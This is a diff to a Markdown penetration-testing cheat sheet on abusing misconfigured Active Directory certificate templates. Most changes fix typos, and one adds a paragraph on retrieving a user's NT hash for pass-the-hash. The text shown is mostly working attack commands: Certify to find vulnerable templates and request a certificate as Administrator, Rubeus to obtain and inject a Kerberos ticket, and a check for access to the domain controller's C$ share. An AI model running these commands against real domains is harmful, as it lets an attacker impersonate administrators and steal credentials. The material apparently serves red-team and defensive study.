@@ -15,7 +15,7 @@ Most important values:
 `Certify` is a tool to enumerate and abuse misconfiguration in AD CS (vulnerable certificate templates).
 
 ```powershell
-# Check possible vulnerabilitis in AD certificates
+# Check possible vulnerabilities in AD certificates
 Certify.exe find /vulnerable
 ```
 
@@ -28,9 +28,11 @@ Certify.exe request /ca:<ca-name> /template:<template-name> /altname:Administrat
 # Request Kerberos TGT using the received certificate
 Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx> /password:password /ptt
 
-# Check if privilege escalation works
+# Check if privilege escalation works (it might not work but look for NT hash)
 dir \\<dc>\C$
 ```
+
+Requesting TGT using the certificate (with `Rubeus`) should return user's NT hash that can be use to **pass-the-hash** (if PKINIT is enabled). It uses so-called user-to-user (u2u) auth - the user authenticates to itself using Kerberos and retrieves its NT hash.
 
 **NOTE**: Certify.exe returns a `PEM` format certificate. It must be converted into the `PFX` format to use it with `Rubeus`:
 
@@ -40,4 +42,4 @@ openssl pkcs12 -in <cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Prov
 
 > **RESOURCES**: [Awesome BlackHat explanation](https://www.youtube.com/watch?v=ejmAIgxFRgM), [corresponding blog post](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
 
-Most `impacket` tools is able to work with TGT authentication.
+Most `impacket` tools are able to work with TGT authentication.
